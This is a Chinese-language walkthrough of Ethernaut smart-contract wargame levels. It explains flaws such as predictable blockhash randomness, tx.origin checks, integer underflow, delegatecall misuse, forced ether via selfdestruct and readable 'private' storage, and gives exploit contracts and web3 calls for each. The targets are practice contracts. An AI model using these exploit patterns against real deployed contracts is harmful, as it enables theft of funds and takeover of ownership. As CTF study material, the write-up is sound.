https://ethernaut.openzeppelin.com/

# challenges

## Fallback

此challenge重点在[fallback函数](https://docs.soliditylang.org/en/latest/contracts.html?highlight=fallback#fallback-function)

fallback函数在以下情况会执行：
- 调用该合约中不存在的函数
- 有账户向该合约发送以太币(没有相应的接收函数)

通过`contract.sentTransaction({value: 1})`即可调用`fallback()`函数

## Coin Flip

此challenge重点在随机数安全

通过challenge的条件是连续猜对十个bool值，该bool是从上一个区块的哈希值计算出：
```solidity
uint256 blockValue = uint256(blockhash(block.number.sub(1)));
uint256 coinFlip = blockValue.div(FACTOR);
bool side = coinFlip == 1 ? true : false;
```

上一个区块的哈希值是链上公开数据。解决方法是：自己部署一个合约，用相同的逻辑计算出该bool值，再调用challenge中的合约把事先计算出的答案传递过去。

```solidity
pragma solidity ^0.6.0;

import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol';
import './coinflip.sol';

contract CoinFlipPoc {
  using SafeMath for uint256;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  CoinFlip target;
  
  constructor (address adimAddr) public {
      target = CoinFlip(adimAddr);
  }

  function hack() public {
      uint256 blockValue = uint256(blockhash(block.number.sub(1)));
      uint256 coinFlip =uint256(uint256(blockValue) / FACTOR);
      bool guess = coinFlip == 1 ? true : false;
      target.flip(guess);
  }
}
```

## Telephone

```solidity
function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
```

[官方文档](https://docs.soliditylang.org/en/latest/cheatsheet.html?highlight=tx.origin#global-variables)
`tx.origin`和`msg.sender`的区别

- `msg.sender` (address): sender of the message (current call)
- `tx.origin` (address): sender of the transaction (full call chain)

然后合约中可以调用其他合约。自己起个合约调用challenge合约中的`changeOwner`函数即可。
此时`tx.origin`就是我的地址，`msg.sender`是我部署的合约的地址。

```solidity
pragma solidity ^0.6.0;

import './telephone.sol';

contract Exp_Telephone {

  Telephone public aim;

  constructor(address _aim) public {
    aim = Telephone(_aim);
  }

  function hack(address me) public {
    aim.changeOwner(me);
  }
}
```

## Token

正整形数的下溢

```solidity
function transfer(address _to, uint _value) public returns (bool) {
  require(balances[msg.sender] - _value >= 0);
  balances[msg.sender] -= _value;
  balances[_to] += _value;
  return true;
}
```

用户初始balances为20，只要向其他地址发送大于20的就会产生下溢，得到一个很大的数字。

```javascript
await contract.transfer("0x"+"0".repeat(40), 21)
```

## Delegation

参考https://paper.seebug.org/633

几种调用合约方法的区别：

- call: msg 的值会修改，执行环境改变
- delegatecall: msg 的值不会被修改，执行环境不变
- callcode: msg 的值会被修改，执行环境不变

delegatecall和callcode的执行环境不变，并不是变量名相同

而是指在赋值的时候，该变量在此合约对应slot映射到原来合约的slot

见 https://github.com/ethereum/solidity/issues/944

其次这三个函数的调用方法都相同，均为：

```solidity
addr.call(bytes4(keccak256("test()")));  // no params
addr.call(bytes4(keccak256("test(uint256)")), 10);  // with params
```

web3中的调用方法为：

```javascript
await contract.sendTransaction({data: web3.utils.sha3("pwn()").slice(0,10)});
```

## Force

合约没有任何内容，challenge通过的条件为合约地址中余额大于0

```javascript
web3.eth.sendTransaction({from: player, to: contract.address, value: 1})
```

直接发送会失败。
两种方法：

- 创建一个合约并让它自毁，指定自毁后余额去向
- 挖矿并将奖励接收地址设置为它

payload：

```solidity
pragma solidity ^0.6.0;

contract Force_exp {
    constructor() payable public{}
    
    function exp(address aim) public{
        selfdestruct(payable(aim));
    }
}
```

## Vault

该challenge有一个被private修饰的password，需要获取password值。

[官方文档](https://docs.soliditylang.org/en/latest/contracts.html?highlight=private#visibility-and-getters) 
描述针对状态变量的三种visibility区别：

- `public` can be either called internally or via messages. For public state variables, an automatic getter function (see below) is generated.
- `internal` can only be accessed internally (i.e. from within the current contract or contracts deriving from it), without using this. This is the default visibility level for state variables.
- `private` only visible for the contract they are defined in and not in derived contracts.

下面还给了个note：

>Everything that is inside a contract is visible to all observers external to the blockchain. Making something private only prevents other contracts from reading or modifying the information, but it will still be visible to the whole world outside of the blockchain.

也就是说，private仅仅起到可以不被其他合约读取和修改，但还是属于链上公开信息。

```solidity
constructor(bytes32 _password) public {
  locked = true;
  password = _password;
}
```

该合约在创建时，password是输入数据，因此顺着合约地址找到 [区块链浏览器](https://rinkeby.etherscan.io/) 上对应创建合约的这笔交易信息的State中可以看到对State的修改也即password的修改

更好的做法是利用web3

```javascript
web3.utils.toAscii(await web3.eth.getStorageAt(contract.address, 1))
```

## King

此challenge提供了一种攻击transfer()的方法

由于transfer调用失败时会进行回滚，后面的代码无法执行，构造一个没有实现payable的合约地址，即可使下面代码一直调用失败：

```solidity
givenaddress.transfer(msg.value);
```